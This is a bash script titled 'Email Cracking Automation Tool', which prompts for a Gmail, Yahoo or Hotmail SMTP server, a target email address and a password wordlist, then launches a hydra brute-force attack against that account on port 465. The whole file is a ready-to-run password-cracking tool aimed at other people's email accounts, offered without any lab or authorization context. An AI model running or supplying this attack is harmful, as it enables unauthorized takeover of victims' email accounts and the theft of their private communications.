#! /bin/bash
#By Th3 Jes7er
echo -e '\e[93m
 ▄████▄   ██▀███   ▄▄▄      ▒██   ██▒ ██▓    
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒▒ █ █ ▒░▓██▒    
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░░  █   ░▒██░    
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██  ░ █ █ ▒ ▒██░    
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ▒██▒░██████▒
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░░ ▒░▓  ░
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░░ ░ ▒  ░
░          ░░   ░   ░   ▒    ░    ░    ░ ░   
░ ░         ░           ░  ░ ░    ░      ░  ░
░    By Th3 Jes7er  
     Email Cracking Automation Tool / Hydra'
echo "  "
echo "SMTP services (email provider):"
echo "[1] Gmail = smtp.gmail.com "
echo "[2] Yahoo = smtp.mail.yahoo.com" 
echo "[3] Hotmail = smtp.live.com"
echo "Select a SMTP service(1-3):"
read smtp1
if [ $smtp1 == 1 ]
then
    smtp='smtp.gmail.com'
    echo "Gmail selected!"
elif [ $smtp1 == 2 ]
then
    smtp='smtp.mail.yahoo.com'
    echo "Yahoo selected!"
elif [ $smtp1 == 3 ]
then
    smtp='smtp.live.com'
    echo "Hotmail selected!"
fi
echo "Enter Target Email Address:"
read email
echo "Password Wordlist:"
read wordlist
echo " "
echo "Email cracking will begin shortly..."
hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp